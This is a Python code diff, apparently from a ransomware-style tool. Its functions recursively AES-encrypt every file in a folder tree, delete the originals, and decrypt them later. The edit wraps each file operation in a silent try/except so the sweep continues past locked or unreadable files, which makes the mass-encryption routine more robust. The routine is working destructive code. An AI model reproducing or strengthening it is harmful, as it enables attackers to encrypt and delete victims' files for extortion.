@@ -48,20 +48,22 @@ def Encryption_all_files_in_folder(folder_path, AES_KEY):
         full_path = os.path.join(folder_path, file_name)
         
         if os.path.isfile(full_path):
-            with open(full_path,"rb") as f:
-                file_data = f.read()
-                
-            iv = get_random_bytes(16)
-            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-            encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
-            encrypted_path = full_path + "_"
+            try:
+                with open(full_path,"rb") as f:
+                    file_data = f.read()
 
-            with open(encrypted_path, "wb") as f:
-                f.write(iv + encrypted_data)
-            
-            os.remove(full_path)
+                iv = get_random_bytes(16)
+                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+                encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
+                encrypted_path = full_path + "_"
 
+                with open(encrypted_path, "wb") as f:
+                    f.write(iv + encrypted_data)
 
+                os.remove(full_path)
+
+            except Exception as e:
+                continue
 
         elif os.path.isdir(full_path):
             Encryption_all_files_in_folder(full_path, AES_KEY)
@@ -71,21 +73,25 @@ def Decryption_all_files_in_folder(folder_path, AES_KEY):
         full_path = os.path.join(folder_path, file_name)
 
         if os.path.isfile(full_path):
-            with open(full_path, "rb") as f:
-                file_data = f.read()
+            try:
+                with open(full_path, "rb") as f:
+                    file_data = f.read()
 
-            iv = file_data[:16]
-            encrypted_data = file_data[16:]
+                iv = file_data[:16]
+                encrypted_data = file_data[16:]
 
-            cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
-            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
+                decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
 
-            decrypted_path = full_path.rstrip("_") 
+                decrypted_path = full_path.rstrip("_")
 
-            with open(decrypted_path, "wb") as f:
-                f.write(decrypted_data)
+                with open(decrypted_path, "wb") as f:
+                    f.write(decrypted_data)
 
-            os.remove(full_path)
+                os.remove(full_path)
+
+            except Exception as e:
+                continue
 
         elif os.path.isdir(full_path):
             Decryption_all_files_in_folder(full_path, AES_KEY)
